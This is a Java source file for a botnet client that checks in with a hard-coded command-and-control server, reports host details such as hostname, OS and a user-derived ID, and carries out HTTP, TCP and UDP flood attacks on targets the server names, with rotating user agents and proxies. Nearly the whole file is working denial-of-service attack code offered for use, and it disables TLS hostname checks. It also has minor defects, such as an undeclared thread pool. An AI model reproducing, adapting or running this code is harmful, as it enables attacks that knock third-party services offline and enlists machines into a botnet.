import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.security.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import javax.net.ssl.*;
import org.json.*;

public class EnhancedBotClient {
    
    // Configuration
    private static final String SERVER_URL = "https://c2-server-io.onrender.com";
    private static final int MAX_RETRY_DELAY = 300;
    
    private String botId;
    private boolean running = true;
    private boolean approved = false;
    private Set<String> activeAttacks = Collections.synchronizedSet(new HashSet<>());
    private int connectionRetries = 0;
    
    private Map<String, Object> specs = new HashMap<>();
    private Map<String, Object> stats = new HashMap<>();
    
    private List<Map<String, String>> userAgents = new ArrayList<>();
    private List<String> proxies = new ArrayList<>();
    
    public EnhancedBotClient() {
        this.botId = generateBotId();
        initDefaultUserAgents();
        initSpecs();
        displayBanner();
    }
    
    private void initDefaultUserAgents() {
        userAgents.add(Map.of("agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"));
        userAgents.add(Map.of("agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"));
        userAgents.add(Map.of("agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"));
    }
    
    private void initSpecs() {
        specs.put("bot_id", botId);
        specs.put("cpu_cores", Runtime.getRuntime().availableProcessors());
        specs.put("ram_gb", String.format("%.1f", Runtime.getRuntime().totalMemory() / (1024.0 * 1024 * 1024)));
        specs.put("os", System.getProperty("os.name"));
        specs.put("hostname", getHostname());
        
        Map<String, Boolean> capabilities = new HashMap<>();
        capabilities.put("http", true);
        capabilities.put("tcp", true);
        capabilities.put("udp", true);
        capabilities.put("resource_optimized", true);
        capabilities.put("auto_connect", true);
        
        specs.put("capabilities", capabilities);
        
        stats.put("total_attacks", 0);
        stats.put("successful_attacks", 0);
        stats.put("total_requests", 0);
        stats.put("uptime", System.currentTimeMillis());
    }
    
    private String generateBotId() {
        try {
            String uniqueId = System.getProperty("user.name") + 
                             System.getProperty("os.name") + 
                             System.getenv("COMPUTERNAME") + 
                             System.getenv("HOSTNAME");
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] hash = md.digest(uniqueId.getBytes());
            StringBuilder hex = new StringBuilder();
            for (byte b : hash) {
                hex.append(String.format("%02x", b));
            }
            return hex.toString().substring(0, 12).toUpperCase();
        } catch (Exception e) {
            return UUID.randomUUID().toString().substring(0, 12).toUpperCase();
        }
    }
    
    private String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private void displayBanner() {
        System.out.println("\n" + "=".repeat(60));
        System.out.println("  ENHANCED BOT CLIENT v3.0 - JAVA");
        System.out.println("=".repeat(60));
        System.out.printf("\n[+] BOT ID: %s\n", botId);
        System.out.printf("[+] CPU: %s cores\n", specs.get("cpu_cores"));
        System.out.printf("[+] RAM: %sGB\n", specs.get("ram_gb"));
        System.out.printf("[+] OS: %s\n", specs.get("os"));
        System.out.printf("[+] Hostname: %s\n", specs.get("hostname"));
        
        System.out.println("\n[*] FEATURES:");
        System.out.println("    [OK] RESOURCE OPTIMIZED (Server-defined threads)");
        System.out.println("    [OK] MULTI-THREADED ATTACKS");
        System.out.println("    [OK] AUTO-RECONNECT ON DISCONNECT");
        System.out.println("    [OK] CUSTOM USER AGENTS FROM SERVER");
        System.out.println("    [OK] OPTIONAL PROXY SUPPORT");
        
        System.out.println("\n" + "=".repeat(60) + "\n");
    }
    
    private boolean checkInternetConnection() {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress("8.8.8.8", 53), 3000);
            return true;
        } catch (Exception e) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress("www.google.com", 80), 3000);
                return true;
            } catch (Exception ex) {
                return false;
            }
        }
    }
    
    private void waitForInternet() {
        System.out.println("\n[X] No internet connection detected");
        System.out.println("[...] Waiting for internet connection...");
        
        while (!checkInternetConnection()) {
            System.out.print("\r[...] Checking connection...");
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
        
        System.out.println("\n[OK] Internet connection restored!");
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    private int calculateRetryDelay() {
        int delay = (int) Math.min(5 * Math.pow(2, connectionRetries), MAX_RETRY_DELAY);
        return delay;
    }
    
    private String sendRequest(String endpoint, String method, String jsonBody) throws IOException {
        URL url = new URL(SERVER_URL + endpoint);
        HttpURLConnection conn;
        
        if (url.getProtocol().equals("https")) {
            HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
            httpsConn.setHostnameVerifier((hostname, session) -> true);
            conn = httpsConn;
        } else {
            conn = (HttpURLConnection) url.openConnection();
        }
        
        conn.setRequestMethod(method);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("Accept", "application/json");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        
        if (jsonBody != null && method.equals("POST")) {
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonBody.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
        }
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
                return response.toString();
            }
        }
        return null;
    }
    
    private boolean checkApproval() throws IOException {
        try {
            Map<String, Object> data = new HashMap<>();
            data.put("bot_id", botId);
            data.put("specs", specs);
            data.put("stats", stats);
            
            String jsonBody = new JSONObject(data).toString();
            String response = sendRequest("/check_approval", "POST", jsonBody);
            
            if (response != null) {
                JSONObject jsonResponse = new JSONObject(response);
                connectionRetries = 0;
                return jsonResponse.getBoolean("approved");
            }
        } catch (Exception e) {
            throw new IOException("Connection failed: " + e.getMessage());
        }
        return false;
    }
    
    private List<Map<String, Object>> getCommands() throws IOException {
        try {
            String response = sendRequest("/commands/" + botId, "GET", null);
            if (response != null) {
                JSONObject jsonResponse = new JSONObject(response);
                JSONArray commandsArray = jsonResponse.getJSONArray("commands");
                
                List<Map<String, Object>> commands = new ArrayList<>();
                for (int i = 0; i < commandsArray.length(); i++) {
                    JSONObject cmd = commandsArray.getJSONObject(i);
                    Map<String, Object> command = new HashMap<>();
                    for (String key : cmd.keySet()) {
                        command.put(key, cmd.get(key));
                    }
                    commands.add(command);
                }
                connectionRetries = 0;
                return commands;
            }
        } catch (Exception e) {
            throw new IOException("Failed to get commands: " + e.getMessage());
        }
        return new ArrayList<>();
    }
    
    private void sendStatus(String status, String message) {
        try {
            stats.put("uptime", System.currentTimeMillis() - (Long) stats.get("uptime"));
            
            Map<String, Object> data = new HashMap<>();
            data.put("bot_id", botId);
            data.put("status", status);
            data.put("message", message);
            data.put("stats", stats);
            data.put("active_attacks", activeAttacks.size());
            
            String jsonBody = new JSONObject(data).toString();
            sendRequest("/status", "POST", jsonBody);
            connectionRetries = 0;
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void executeCommand(Map<String, Object> cmd) {
        String cmdType = (String) cmd.get("type");
        
        System.out.println("\n" + "=".repeat(60));
        System.out.println("[->] COMMAND: " + cmdType);
        System.out.println("=".repeat(60));
        
        try {
            switch (cmdType) {
                case "ping":
                    cmdPing();
                    break;
                case "http_flood":
                    cmdHttpFlood(cmd);
                    break;
                case "tcp_flood":
                    cmdTcpFlood(cmd);
                    break;
                case "udp_flood":
                    cmdUdpFlood(cmd);
                    break;
                case "sysinfo":
                    cmdSysinfo();
                    break;
                case "stop_all":
                    cmdStopAll();
                    break;
                default:
                    System.out.println("[!] Unknown command: " + cmdType);
            }
        } catch (Exception e) {
            System.out.println("[!] Error: " + e.getMessage());
            sendStatus("error", e.getMessage());
        }
    }
    
    private void cmdPing() {
        sendStatus("success", "pong");
        System.out.println("[OK] Pong!");
    }
    
    private void cmdHttpFlood(Map<String, Object> cmd) {
        String target = (String) cmd.get("target");
        int duration = ((Number) cmd.get("duration")).intValue();
        int threads = ((Number) cmd.get("threads")).intValue(); // Use server-defined threads
        String method = (String) cmd.getOrDefault("method", "GET");
        
        // Get user agents from command or use defaults
        List<String> userAgentList = new ArrayList<>();
        if (cmd.containsKey("user_agents")) {
            Object uaObj = cmd.get("user_agents");
            if (uaObj instanceof JSONArray) {
                JSONArray uaArray = (JSONArray) uaObj;
                for (int i = 0; i < uaArray.length(); i++) {
                    userAgentList.add(uaArray.getString(i));
                }
            } else if (uaObj instanceof List) {
                userAgentList = (List<String>) uaObj;
            }
        }
        
        if (userAgentList.isEmpty()) {
            for (Map<String, String> ua : userAgents) {
                userAgentList.add(ua.get("agent"));
            }
        }
        
        // Get proxies from command
        List<String> proxyList = new ArrayList<>();
        if (cmd.containsKey("proxies")) {
            Object proxyObj = cmd.get("proxies");
            if (proxyObj instanceof JSONArray) {
                JSONArray proxyArray = (JSONArray) proxyObj;
                for (int i = 0; i < proxyArray.length(); i++) {
                    proxyList.add(proxyArray.getString(i));
                }
            } else if (proxyObj instanceof List) {
                proxyList = (List<String>) proxyObj;
            }
        }
        
        System.out.println("[*] OPTIMIZED HTTP FLOOD");
        System.out.println("    Target: " + target);
        System.out.println("    Method: " + method);
        System.out.println("    Duration: " + duration + "s");
        System.out.println("    Threads: " + threads + " (Server-defined)");
        System.out.println("    User Agents: " + userAgentList.size());
        System.out.println("    Proxies: " + (proxyList.isEmpty() ? "None" : proxyList.size()));
        
        stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
        sendStatus("running", method + " FLOOD: " + target);
        
        String attackId = "http_" + System.currentTimeMillis();
        activeAttacks.add(attackId);
        
        AtomicInteger requestCount = new AtomicInteger(0);
        AtomicInteger successCount = new AtomicInteger(0);
        
        Runnable floodWorker = () -> {
            long endTime = System.currentTimeMillis() + (duration * 1000);
            Random random = new Random();
            
            while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
                try {
                    URL url = new URL(target);
                    HttpURLConnection conn;
                    
                    if (url.getProtocol().equals("https")) {
                        HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
                        httpsConn.setHostnameVerifier((hostname, session) -> true);
                        conn = httpsConn;
                    } else {
                        conn = (HttpURLConnection) url.openConnection();
                    }
                    
                    conn.setRequestMethod(method);
                    conn.setRequestProperty("User-Agent", userAgentList.get(random.nextInt(userAgentList.size())));
                    conn.setRequestProperty("Accept", "*/*");
                    conn.setRequestProperty("Connection", "keep-alive");
                    conn.setRequestProperty("Cache-Control", "no-cache");
                    conn.setConnectTimeout(3000);
                    conn.setReadTimeout(3000);
                    
                    if (method.equals("GET") || method.equals("HEAD")) {
                        conn.connect();
                    } else if (method.equals("POST")) {
                        conn.setDoOutput(true);
                        String payload = "data=" + "x".repeat(random.nextInt(900) + 100);
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(payload.getBytes());
                        }
                    }
                    
                    int responseCode = conn.getResponseCode();
                    requestCount.incrementAndGet();
                    if (responseCode < 500) {
                        successCount.incrementAndGet();
                    }
                    
                    conn.disconnect();
                    Thread.sleep(1); // Small delay to prevent overload
                    
                } catch (Exception e) {
                    requestCount.incrementAndGet();
                    try {
                        Thread.sleep(10);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        };
        
        System.out.println("[+] Launching " + threads + " attack threads (Server-defined)...");
        
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        List<Future<?>> futures = new ArrayList<>();
        
        for (int i = 0; i < threads; i++) {
            futures.add(executor.submit(floodWorker));
        }
        
        long startTime = System.currentTimeMillis();
        int lastCount = 0;
        
        while (System.currentTimeMillis() - startTime < (duration * 1000) && activeAttacks.contains(attackId)) {
            try {
                Thread.sleep(1000);
                long elapsed = System.currentTimeMillis() - startTime;
                
                int current = requestCount.get();
                int rps = current - lastCount;
                double avgRps = elapsed > 0 ? current / (elapsed / 1000.0) : 0;
                
                System.out.printf("\r[>>] Total: %,d | RPS: %,d | Avg: %.0f | Success: %,d",
                        current, rps, avgRps, successCount.get());
                
                lastCount = current;
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        
        executor.shutdown();
        try {
            executor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        activeAttacks.remove(attackId);
        
        System.out.printf("\n[OK] FLOOD COMPLETE: %,d requests sent!\n", requestCount.get());
        stats.put("total_requests", ((Integer) stats.get("total_requests")) + requestCount.get());
        stats.put("successful_attacks", ((Integer) stats.get("successful_attacks")) + 1);
        sendStatus("success", String.format("Flood: %,d req @ %.0f rps", 
                requestCount.get(), requestCount.get() / (double) duration));
    }
    
    private void cmdTcpFlood(Map<String, Object> cmd) {
        String target = (String) cmd.get("target");
        int duration = ((Number) cmd.get("duration")).intValue();
        int threads = ((Number) cmd.get("threads")).intValue(); // Use server-defined threads
        
        String host;
        int port;
        if (target.contains(":")) {
            String[] parts = target.split(":");
            host = parts[0];
            port = Integer.parseInt(parts[1]);
        } else {
            host = target;
            port = 80;
        }
        
        System.out.println("[*] OPTIMIZED TCP FLOOD");
        System.out.println("    Target: " + host + ":" + port);
        System.out.println("    Duration: " + duration + "s");
        System.out.println("    Threads: " + threads + " (Server-defined)");
        
        stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
        sendStatus("running", "TCP FLOOD: " + host + ":" + port);
        
        String attackId = "tcp_" + System.currentTimeMillis();
        activeAttacks.add(attackId);
        
        AtomicInteger requestCount = new AtomicInteger(0);
        
        Runnable tcpWorker = () -> {
            long endTime = System.currentTimeMillis() + (duration * 1000);
            Random random = new Random();
            
            while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
                try (Socket socket = new Socket()) {
                    socket.connect(new InetSocketAddress(host, port), 1000);
                    
                    String payload = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
                    socket.getOutputStream().write(payload.getBytes());
                    
                    // Add random data
                    byte[] randomData = new byte[256];
                    random.nextBytes(randomData);
                    socket.getOutputStream().write(randomData);
                    
                    requestCount.incrementAndGet();
                    Thread.sleep(10); // Prevent overload
                } catch (Exception e) {
                    requestCount.incrementAndGet();
                    try {
                        Thread.sleep(50);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        };
        
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        List<Future<?>> futures = new ArrayList<>();
        
        for (int i = 0; i < threads; i++) {
            futures.add(executor.submit(tcpWorker));
        }
        
        long startTime = System.currentTimeMillis();
        
        while (System.currentTimeMillis() - startTime < (duration * 1000) && activeAttacks.contains(attackId)) {
            try {
                Thread.sleep(1000);
                System.out.printf("\r[>>] TCP Connections: %,d", requestCount.get());
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        
        executor.shutdown();
        try {
            executor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        activeAttacks.remove(attackId);
        
        System.out.printf("\n[OK] TCP flood: %,d connections\n", requestCount.get());
        stats.put("total_requests", ((Integer) stats.get("total_requests")) + requestCount.get());
        stats.put("successful_attacks", ((Integer) stats.get("successful_attacks")) + 1);
        sendStatus("success", String.format("TCP flood: %,d conn", requestCount.get()));
    }
    
    private void cmdUdpFlood(Map<String, Object> cmd) {
        String target = (String) cmd.get("target");
        int duration = ((Number) cmd.get("duration")).intValue();
        int threads = ((Number) cmd.get("threads")).intValue(); // Use server-defined threads
        
        String host;
        int port;
        if (target.contains(":")) {
            String[] parts = target.split(":");
            host = parts[0];
            port = Integer.parseInt(parts[1]);
        } else {
            host = target;
            port = 53;
        }
        
        System.out.println("[*] OPTIMIZED UDP FLOOD");
        System.out.println("    Target: " + host + ":" + port);
        System.out.println("    Duration: " + duration + "s");
        System.out.println("    Threads: " + threads + " (Server-defined)");
        
        stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
        sendStatus("running", "UDP FLOOD: " + host + ":" + port);
        
        String attackId = "udp_" + System.currentTimeMillis();
        activeAttacks.add(attackId);
        
        AtomicInteger requestCount = new AtomicInteger(0);
        
        Runnable udpWorker = () -> {
            long endTime = System.currentTimeMillis() + (duration * 1000);
            Random random = new Random();
            
            try (DatagramSocket socket = new DatagramSocket()) {
                InetAddress address = InetAddress.getByName(host);
                
                while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
                    try {
                        byte[] payload = new byte[random.nextInt(1536) + 512]; // 512-2048 bytes
                        random.nextBytes(payload);
                        
                        DatagramPacket packet = new DatagramPacket(payload, payload.length, address, port);
                        socket.send(packet);
                        
                        requestCount.incrementAndGet();
                        Thread.sleep(1); // Prevent overload
                    } catch (Exception e) {
                        // Continue on error
                    }
                }
            } catch (Exception e) {
                // Socket creation failed
            }
        };
        
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        List<Future<?>> futures = new ArrayList<>();
        
        for (int i = 0; i < threads; i++) {
            futures.add(executor.submit(udpWorker));
        }
        
        long startTime = System.currentTimeMillis();
        
        while (System.currentTimeMillis() - startTime < (duration * 1000) && activeAttacks.contains(attackId)) {
            try {
                Thread.sleep(1000);
                System.out.printf("\r[>>] UDP Packets: %,d", requestCount.get());
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        
        executor.shutdown();
        try {
            executor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        activeAttacks.remove(attackId);
        
        System.out.printf("\n[OK] UDP flood: %,d packets\n", requestCount.get());
        stats.put("total_requests", ((Integer) stats.get("total_requests")) + requestCount.get());
        stats.put("successful_attacks", ((Integer) stats.get("successful_attacks")) + 1);
        sendStatus("success", String.format("UDP flood: %,d packets", requestCount.get()));
    }
    
    private void cmdSysinfo() {
        StringBuilder info = new StringBuilder();
        info.append("CPU Cores: ").append(specs.get("cpu_cores")).append("\n");
        info.append("RAM: ").append(specs.get("ram_gb")).append("GB\n");
        info.append("OS: ").append(specs.get("os")).append("\n");
        info.append("Active Attacks: ").append(activeAttacks.size()).append("\n");
        info.append("Total Attacks: ").append(stats.get("total_attacks")).append("\n");
        info.append("Total Requests: ").append(String.format("%,d", stats.get("total_requests")));
        
        System.out.println("[*] System Info:\n" + info.toString());
        sendStatus("success", info.toString());
    }
    
    private void cmdStopAll() {
        System.out.println("[!] Stopping all attacks...");
        int count = activeAttacks.size();
        activeAttacks.clear();
        System.out.println("[OK] Stopped " + count + " attacks");
        sendStatus("success", "Stopped " + count);
    }
    
    public void run() {
        while (running) {
            try {
                // Check internet connection
                if (!checkInternetConnection()) {
                    waitForInternet();
                    connectionRetries = 0;
                }
                
                System.out.println("\n[*] Connecting to server: " + SERVER_URL);
                System.out.println("[*] Waiting for auto-approval...\n");
                
                // Wait for approval
                approved = false;
                while (!approved) {
                    try {
                        if (!checkInternetConnection()) {
                            waitForInternet();
                            continue;
                        }
                        
                        if (checkApproval()) {
                            approved = true;
                            System.out.println("\n" + "=".repeat(60));
                            System.out.println("  BOT APPROVED! READY FOR OPERATIONS");
                            System.out.println("=".repeat(60) + "\n");
                            break;
                        } else {
                            System.out.print("\r[...] Waiting for approval (ID: " + botId + ")...");
                            Thread.sleep(5000);
                        }
                    } catch (IOException e) {
                        connectionRetries++;
                        int delay = calculateRetryDelay();
                        
                        System.out.println("\n[X] Connection lost: " + e.getMessage());
                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s before reconnecting...");
                        
                        for (int remaining = delay; remaining > 0; remaining--) {
                            if (!checkInternetConnection()) {
                                waitForInternet();
                                break;
                            }
                            System.out.print("\r[...] Reconnecting in " + remaining + "s");
                            Thread.sleep(1000);
                        }
                        
                        System.out.println("\n[->] Attempting to reconnect...");
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
                
                System.out.println("[+] Active. Listening for commands...\n");
                
                // Main command loop
                while (running && approved) {
                    try {
                        if (!checkInternetConnection()) {
                            System.out.println("\n[X] Internet connection lost");
                            waitForInternet();
                            approved = false;
                            break;
                        }
                        
                        List<Map<String, Object>> commands = getCommands();
                        for (Map<String, Object> cmd : commands) {
                            threadPool.submit(() -> executeCommand(cmd));
                        }
                        
                        Thread.sleep(5000);
                        
                    } catch (IOException e) {
                        connectionRetries++;
                        int delay = calculateRetryDelay();
                        
                        System.out.println("\n[X] Lost connection to C2 server: " + e.getMessage());
                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
                        
                        for (int remaining = delay; remaining > 0; remaining--) {
                            if (!checkInternetConnection()) {
                                waitForInternet();
                                break;
                            }
                            System.out.print("\r[...] Reconnecting in " + remaining + "s");
                            Thread.sleep(1000);
                        }
                        
                        System.out.println("\n[->] Attempting to reconnect...");
                        approved = false;
                        break;
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        System.out.println("\n[!] Stopping...");
                        cmdStopAll();
                        running = false;
                        return;
                    }
                }
                
            } catch (Exception e) {
                System.out.println("\n[!] Error: " + e.getMessage());
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }
    }
    
    public static void main(String[] args) {
        System.out.println("\n" + "=".repeat(60));
        System.out.println("  ENHANCED BOT CLIENT - JAVA VERSION");
        System.out.println("=".repeat(60));
        
        try {
            EnhancedBotClient client = new EnhancedBotClient();
            client.run();
        } catch (Exception e) {
            System.out.println("\n[!] Fatal error: " + e.getMessage());
            System.exit(1);
        }
    }
}